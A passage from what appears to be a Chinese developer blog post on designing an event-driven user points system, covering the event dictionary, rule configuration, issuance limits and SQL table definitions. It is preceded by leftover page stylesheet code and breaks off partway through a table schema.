slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h3 data-id="heading-0">业务背景</h3>
<p>大家好，我是卡卡，在大多数 C 端产品里，想要提升用户留存和消费能力，除了不断的营销活动之外，<strong>积分系统同样是一个非常重要、而且使用频率极高的基础模块</strong>。从签到、下单、活动任务、邀请、兑换商品、抽奖等场景来看，用户的很多核心行为，最终都会通过积分这种形式被承接和放大。</p>
<p>对运营来说，积分是最常用、也是最灵活的一种激励手段； 对用户来说，积分则是一种持续存在、可累计、可感知的长期权益。</p>
<p>也正因为这样，积分系统往往会在不知不觉中承担越来越多的职责。</p>
<p>在实际业务中，积分系统一开始看起来并不复杂：配置规则、触发发放、更新余额，好像逻辑也不难。但真正跑起来之后，很容易随着规则不断增加、活动频繁叠加、人工操作逐步介入，慢慢演变成一个<strong>既难维护、又不好追溯</strong>的系统。很多问题并不是立刻暴露出来，而是在出问题之后才发现，系统本身缺乏足够的约束能力和解释能力。</p>
<p>在这次的积分系统设计中，我们同样采用了<strong>基于事件驱动的整体思路</strong>。所有积分行为，都从明确的业务事件开始，由事件触发规则，由规则决定是否发放积分，再进入后续的结算、风控与审计流程。通过把“发生了什么”和“为什么会发积分”拆清楚，尽量让每一次积分变动都可解释、可回溯。</p>
<p>如果有之前看过我写过的那篇文章 <a href="https://juejin.cn/post/7584319403861508131" target="_blank" title="https://juejin.cn/post/7584319403861508131">《活动玩法越堆越乱，我重构了一套事件驱动的活动系统》</a>， 可能会发现两者在整体思路上是相通的。无论是活动系统还是积分系统，本质上都是围绕“事件 + 规则”来展开，只不过积分系统对稳定性、风控和审计的要求要更高。</p>
<p>积分虽然不是直接的金钱，但它天然具备可累计、可放大、可被滥用的特性。一旦出现误发、刷分或者人工操作不当的问题，如果系统设计阶段没有把边界和约束考虑清楚，事后往往很难把问题完整还原出来。</p>
<p>那么我们今天就来一起梳理一下，如果要设计一套<strong>功能规则相对完善的积分系统</strong>，在整体设计上需要重点考虑哪些问题。</p>
<p>后面的内容将结合实际的业务拆分、表结构设计、核心流程实现，以及后台人工操作与审计页面，逐步展开这套积分系统的设计思路与具体落地方式。</p>
<hr/>
<h3 data-id="heading-1">业务现状回顾</h3>
<p>在我们开始设计新的积分体系之前，先简单回顾一下之前业务里的积分是怎么做的。</p>
<p>早期的积分设计其实很常见，也很实用：<br/>
基本不存在规则级别的数据存储，积分发放形式相对固定。即使后来有了活动，或者加了一些延伸功能，本质上也只是<strong>在对应的业务代码里，直接加一段积分增加的逻辑</strong>。</p>
<p>在这种模式下，一个积分流水表，基本就能满足大部分需求，整体实现非常简单，也很好理解。</p>
<p>但问题也很明显，这套设计的<strong>耦合性非常高</strong>。<br/>
每新增一种积分规则，就需要改代码、加判断、重新发版；规则越多，代码分支就越复杂，后期维护成本也会不断放大。</p>
<p>同时，由于积分规则是散落在代码里的，风险其实并不好把控：<br/>
一旦出现异常积分，往往只能看到流水结果，很难快速定位是哪条规则、哪段逻辑出了问题。</p>
<p>随着业务量逐渐变大，很多早期还能接受的设计，开始慢慢不再适用。<br/>
积分系统就是其中一个非常典型的例子。</p>
<p>一方面，比如我们运营希望基于用户侧增加更多积分获取玩法，用来提升活跃和留存；<br/>
另一方面，积分本身也开始承载更多规则诉求，比如需要支持<strong>动态配置的有效期</strong>，甚至不同来源、不同场景下的差异化策略。</p>
<p>在这种背景下，继续沿用原有那套“代码里直接加积分”的方式，已经很难支撑业务继续往前走。</p>
<p>也正是基于这些实际问题，才需要重新去设计一套<strong>能够长期运行、规则可扩展、同时具备审计和回溯能力的积分体系</strong>，而不是简单地在原有代码上继续打补丁。</p>
<hr/>
<h3 data-id="heading-2">设计思路拆解</h3>
<p>我们在明确了为什么要重构积分系统之后，接下来要解决的第一个问题，其实是：<br/>
<strong>积分规则怎么设计，才能既灵活，又不失控。</strong></p>
<p>很明显的一点是，我们如果希望积分规则可以被动态配置，那就不可能再继续把规则写死在代码里。<br/>
一旦规则和代码强耦合，后续每加一种玩法，基本都意味着改代码、发版本，这在实际业务中是很难持续的。</p>
<p>基于这一点，积分系统在设计上自然会走向一个方向：<br/>
<strong>规则和触发逻辑解耦，用事件驱动的方式来承载积分行为。</strong></p>
<p>在实际设计中，我们会先在技术侧约定好一套<strong>积分系统支持的事件体系</strong>，比如哪些用户行为可以被视为积分事件。<br/>
这些事件一旦被定义和发布出来，后续的积分规则，就不再依赖具体业务代码，而是由运营基于这些事件进行组合和配置。</p>
<p>这样一来，技术侧只需要保证事件本身的稳定和完整，<br/>
而运营侧则可以围绕这些事件，灵活地配置不同的积分获取规则。</p>
<p>但有了事件还不够，真正复杂的地方在于：<br/>
<strong>一条积分规则本身，往往需要满足非常多的业务条件。</strong></p>
<p>结合我之前项目以往遇到过的积分获取场景，在设计规则体系时，我们需要重点考虑几个维度。</p>
<p>首先是积分的计算方式。<br/>
有些场景下是固定积分，比如完成一次行为直接给固定数量；<br/>
而有些场景则需要按比例计算，比如消费金额的一定比例转化为积分。</p>
<p>其次是触发条件本身。<br/>
有的规则只要事件发生即可触发，有的则需要满足特定阈值，比如“消费满多少”“充值达到某个金额”之后才生效。</p>
<p>同时，还需要考虑发放次数的限制问题。<br/>
是每次都可以触发，还是每天、每人、每个周期只能生效一次，这些都会直接影响规则的设计方式。</p>
<p>再往下，就是积分的有效期设计。<br/>
有的积分是长期有效的，有的则需要限定使用周期，甚至只能在特定活动或特定场景下使用，这些都需要在规则层面提前考虑清楚。</p>
<p>除此之外，还有一些更偏营销和运营的需求。<br/>
比如活动期间积分翻倍、阶段性加成、灰度测试不同积分策略等，这类需求如果没有提前纳入规则体系设计，后续实现起来会非常被动。</p>
<p>也正是基于这些实际需求，积分系统在规则设计上，不能只满足“能发积分”，<br/>
而是要在一开始就具备足够的扩展空间，能够覆盖常见的业务玩法，同时又不会让系统变得不可控。</p>
<hr/>
<h3 data-id="heading-3">核心模块拆分</h3>
<p>我们在明确了积分规则需要具备足够灵活性之后，接下来的问题就变得很现实了：<br/>
<strong>这些规则、事件、用户积分以及风险能力，应该如何在系统中被合理拆分。</strong></p>
<p>在实际设计积分系统时，其实我们很容易陷入一个误区：<br/>
所有功能围绕用户积分展开，最后所有页面、接口和逻辑都堆在一起，系统看起来完整，但边界非常模糊。</p>
<p>为了避免这种情况，在拆分系统时，我们并打算从页面出发，而是先从<strong>职责和使用对象</strong>的角度去看这套系统。</p>
<p>整体来看，积分系统可以被拆成几类核心能力。</p>
<p>第一类是<strong>积分规则域</strong>。<br/>
这是整个积分系统的“决策中枢”，负责定义什么行为可以产生积分，以及这些积分该如何计算、如何生效。<br/>
积分事件、积分规则以及活动期间的积分倍率，本质上都属于这一层，它们只关心规则本身，而不关心具体的用户是谁。</p>
<p>第二类是<strong>用户积分域</strong>。<br/>
这一部分关注的是积分规则落到具体用户之后的执行结果，包括当前积分状态、即将到期的积分情况，以及完整的积分流水和明细记录。<br/>
它更多是“结果层”，用于承载用户视角下的积分变化。</p>
<p>第三类是<strong>风险管控与审计域</strong>。<br/>
积分一旦具备动态配置能力，风险问题就必须被放到系统设计的一等公民位置。<br/>
异常积分、规则风险、高风险行为识别，以及人工操作的完整审计，都是这一层需要承担的职责。</p>
<p>最后，是<strong>整体运行态的可视化能力</strong>。<br/>
也就是通过仪表盘的方式，将积分发放趋势、规则使用情况以及潜在风险集中呈现出来，用于辅助运营和风控判断。</p>
<p>基于这样的拆分思路，后台管理系统也自然演化成几个相对独立的功能模块，而不是一个围绕“积分列表”不断堆功能的页面集合。</p>
<hr/>
<h3 data-id="heading-4">积分规则域（一）：积分事件的定义与约束</h3>
<p>在积分规则域中，最先需要确定的其实不是规则，而是<strong>事件</strong>。</p>
<p>在后台中，积分事件以一个非常克制的页面形式存在，比如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94b40f846d4b4fb9bfb85e6c5ef451ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=HpYbmnzf6wQUE2ztLl3zXO5jJXI%3D" alt="image-20251230195230248" loading="lazy"/></p>
<p>如图所示，事件列表只用于展示当前系统已经支持的积分事件，包括事件名称、事件编码、事件说明以及当前状态，支持基础的查询和筛选能力，但<strong>不提供新增和编辑功能</strong>。 这个设计本身是有明确边界的。</p>
<p>积分事件并不是运营配置出来的概念，而是对<strong>业务行为的一次抽象定义</strong>，例如用户签到、用户注册、订单支付完成、任务完成，或者人工积分调整等。</p>
<p>这些行为是否真实发生，完全取决于代码是否在对应的业务时机上报了事件。 如果仅仅在后台新增一个事件，但代码侧并没有对应的触发逻辑，那么即使后续配置了积分规则，这条规则也永远不会被触发。</p>
<p>基于这一点，积分事件的管理权被刻意放在了技术侧。 当业务需要新增一种积分事件时，实际的处理流程通常是：</p>
<ul>
<li>技术侧先在业务代码中补充事件上报逻辑，确保事件在正确的业务时机被触发；</li>
<li>随后，在积分系统中新增对应的事件定义，并将事件发布上线；</li>
<li>等事件处于可用状态后，运营侧才能基于该事件去配置积分规则。</li>
</ul>
<p>通过这样的方式，事件本身成为了技术侧与业务侧之间的一种稳定约定，而不是一个可以随意扩展的配置项。</p>
<p><strong>积分事件字典表设计说明</strong></p>
<p>对应后台中的积分事件页面，底层使用了一张事件字典表来承载事件的元信息，表结构如下：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_event` (
  `id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'事件ID（稳定引用键）'</span>,
  `event_code` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'事件编码（技术标识，可调整但不建议频繁改）'</span>,
  `event_name` <span class="hljs-type">varchar</span>(<span class="hljs-number">128</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'事件名称（给人看的，如 订单支付完成）'</span>,
  `event_desc` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'事件说明（触发时机、注意事项）'</span>,
  `status` <span class="hljs-type">varchar</span>(<span class="hljs-number">16</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">'OFFLINE'</span> COMMENT <span class="hljs-string">'状态：OFFLINE=未上线，ONLINE=已上线可用，DEPRECATED=已废弃'</span>,
  `created_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'创建时间'</span>,
  `updated_at` datetime <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> <span class="hljs-keyword">ON</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="hljs-string">'更新时间'</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`),
  <span class="hljs-keyword">UNIQUE</span> KEY `uk_event_code` (`event_code`)
) ENGINE<span class="hljs-operator">=</span>InnoDB COMMENT<span class="hljs-operator">=</span><span class="hljs-string">'积分事件字典表（技术维护，其他表引用 event_id）'</span>;
</code></pre>
<p>表中各字段的职责划分也非常清晰：</p>
<ul>
<li><code>event_code</code> 用于作为<strong>技术侧的稳定标识</strong>，在业务代码中进行事件上报时使用；</li>
<li><code>event_name</code> 和 <code>event_desc</code> 主要用于后台展示和规则配置时的语义说明；</li>
<li><code>status</code> 用于控制事件是否可以被规则引用，避免下线或废弃事件被继续使用；</li>
<li><code>id</code> 作为内部稳定引用键，被积分规则等其他表通过 <code>event_id</code> 进行关联。</li>
</ul>
<p>在规则体系内部，统一通过 <code>event_id</code> 来建立关联关系，而不是直接依赖 <code>event_code</code>，这样可以避免业务编码调整对规则数据产生影响。</p>
<p>同时需要注意的是，事件表本身只承担<strong>事件元信息</strong>的职责： 它定义的是“系统允许感知哪些行为”，而不会直接参与积分计算或积分发放逻辑。</p>
<p>通过这种方式，积分事件在系统中的角色就非常清晰了： 它是一份<strong>由技术侧维护的事件白名单</strong>，用于限定积分系统的感知范围，防止规则体系无限膨胀、失去边界。</p>
<p>也正是有了这一层约束，后续的积分规则配置，才能建立在一个稳定、可控的事件体系之上，而不会出现规则配置失效或行为不可控的问题。</p>
<hr/>
<h3 data-id="heading-5">积分规则域（二）：积分规则如何围绕事件进行配置</h3>
<p>在事件体系确定之后，积分系统真正开始变复杂的地方，才刚刚开始。 因为接下来要解决的问题是：<strong>同一个事件发生之后，积分到底该怎么发。</strong></p>
<p>在后台中，积分规则以一个相对完整的配置页面存在，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6da44cae3207498d978b2b1edc967e9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=ytexj568Ol%2FIslzjb9koDpDFdl0%3D" alt="image-20251230200156943" loading="lazy"/></p>
<p>从列表页可以看到，每一条积分规则都会明确关联一个积分事件，同时还包含计分方式、优先级、状态以及生效时间等信息。 这也意味着，在同一个事件下，是允许存在多条积分规则的。</p>
<p>例如，“订单支付完成”这个事件下，既可以配置常规的消费返积分规则，也可以在活动期间额外配置一条加成规则。</p>
<p>正因为同一事件可能命中多条规则，所以规则本身必须具备<strong>明确的边界和执行顺序</strong>，而不是简单地“事件一触发就加积分”。</p>
<h4 data-id="heading-6">规则的基本信息与执行边界</h4>
<p>在规则的基础信息配置中，首先需要确定的是规则本身的唯一性和可读性。如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e4a222157e7441c852fc1d3191df389~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=8k8F9aSPmLdxTiDuYeRGqVG3%2BIU%3D" alt="image-20251230200403335" loading="lazy"/></p>
<p>规则编码由服务端生成，用于作为规则的稳定标识； 规则描述则更多是给运营和后续维护人员看的，用来说明这条规则的业务含义。</p>
<p>规则与事件之间是一个明确的绑定关系，只有当对应事件被触发时，这条规则才有被执行的可能。</p>
<p>同时，在同一事件下引入了<strong>规则优先级</strong>的概念。 当多个规则同时满足触发条件时，优先级用于控制规则的执行顺序，避免出现规则冲突或重复发放的问题。</p>
<h4 data-id="heading-7">计分方式：固定积分与比例积分</h4>
<p>规则配置中的一个核心能力，是积分的计算方式。如下图所示</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7648a15315e487dab8258f6d4b44adc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=F7oSVAJgoaZZ3XUBpHWbjN3eKtk%3D" alt="image-20251230200450618" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1396d1b5eff84c5aa348f1dc3f1632c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=ZkggQMbcx8vY9%2Fo1cirD7GRe%2BYE%3D" alt="image-20251230200504876" loading="lazy"/></p>
<p>在我们实际业务中，并不是所有场景都适合用固定积分。 因此在设计时，我们将计分方式拆分为两种：</p>
<ul>
<li>固定积分：每次规则生效时，直接发放固定数量的积分；</li>
<li>比例积分：根据事件携带的数据，按比例计算积分，例如“每消费 10 元发放 1 积分”。</li>
</ul>
<p>这两种方式在后台配置层面是互斥的，但在规则模型层面是统一抽象的，方便后续扩展更多计算策略。</p>
<h4 data-id="heading-8">触发条件与发放限制</h4>
<p>除了“怎么算积分”，规则还必须回答两个问题： <strong>什么时候发，以及最多能发多少次。</strong></p>
<p>在规则配置中，引入了触发条件和发放限制两个概念。如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c8b84986c7d64c0c87e6337c9b0725d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=DR9FwcVwW3i5WB4%2Fl%2FR4veW%2BjIk%3D" alt="image-20251230200542727" loading="lazy"/></p>
<p>触发条件用于描述：在一个统计周期内，事件需要累计触发多少次，规则才会真正生效。 例如“每天签到 1 次即可发放积分”，或者“连续触发 2 次后才发放一次积分”。</p>
<p>而发放限制更多是一个拦截机制，用来控制在同一个周期内，这条规则最多可以发放多少次积分。 这类限制在防刷和风控场景中非常关键，可以有效避免某些规则被频繁触发。</p>
<h4 data-id="heading-9">条件配置：让规则具备表达能力</h4>
<p>在很多业务场景下，仅仅依赖事件本身是不够的。 例如消费返积分，往往需要满足“金额达到某个阈值”； 活动规则中，也可能要求满足特定渠道、特定用户类型等条件。</p>
<p>因此在规则中引入了条件配置能力。如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ed8873ab72248309a5db50080654674~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5rSb5Y2h5Y2h5LqG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768183851&amp;x-signature=BHcAhkAsYGmI6EyOx5EKW6v03C8%3D" alt="image-20251230200613586" loading="lazy"/></p>
<p>规则支持通过条件组的方式来组合多个条件： 同一条件组内为 AND 关系，不同条件组之间为 OR 关系。</p>
<p>这样一来，规则就可以表达出相对复杂的业务判断逻辑，而不需要把这些判断写死在代码中。</p>
<h4 data-id="heading-10">积分规则表结构设计说明</h4>
<p>对应后台中的规则配置能力，底层使用了两张表来承载规则数据。</p>
<p>第一张是积分规则主表，用于描述规则的整体行为和执行策略：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `point_rule` (
  `rule_id` <span class="hljs-type">bigint</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="hljs-string">'积分规则ID'</span>,
  `rule_code` <span class="hljs-type">varchar</span>(<span class="hljs-number">64</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则编码'</span>,
  `rule_desc` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> COMMENT <span class="hljs-string">'规则描述'</span>,
